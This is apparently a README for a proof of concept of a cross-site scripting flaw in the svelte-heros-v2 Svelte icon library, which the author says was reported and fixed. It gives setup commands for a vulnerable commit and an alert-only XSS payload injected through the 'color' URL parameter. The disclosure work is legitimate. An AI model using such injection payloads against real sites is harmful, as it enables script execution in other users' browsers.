# svelte-heros-v2 Vulnerbability Proof of Concept

[svelte-heros-v2](https://github.com/shinokada/svelte-heros-v2) is an easy to use heros icon library for svelte projects.
But recent days, I found a vulnerbility in the library. I reported it to the author and he fixed it. I am going to show you how I found it and how to fix it.
- [issues](https://github.com/shinokada/svelte-heros-v2/issues/15)
- [0.5.1 (fixed version)](https://github.com/shinokada/svelte-heros-v2/commit/aed5f0c03f63336e159e2239129a54d377a8eab1)

## Try it yourself

```sh
# Clone the vuln PoC
git clone https://github.com/ZoneTwelve/svelte-heros-v2-vuln-PoC.git
cd svelte-heros-v2-vuln-PoC
# change the commit version d154313cc3031b90f529528fae6fef772103ed4e
git checkout d154313cc3031b90f529528fae6fef772103ed4e
# install dependencies
npm install
# or use pnpm
pnpm install

# start the app
npm run dev

# open http://localhost:5173 
## And you will see a blue eye in the page
echo "http://localhost:5173"

# open http://localhost:5173/?color=green
## The page will show a green eye in the top of Counter component
echo "http://localhost:5173/?color=green"

# Payload: `red"/> <svg onload=alert(document.domain);> <path a="`
# Open http://localhost:5173/?color=red%22/%3E%20%3Csvg%20onload=alert(document.domain);%3E%20%3Cpath%20a=%22
## The page will show a alert box with the domain name of the page
echo "http://localhost:5173/?color=red%22/%3E%20%3Csvg%20onload=alert(document.domain);%3E%20%3Cpath%20a=%22"
```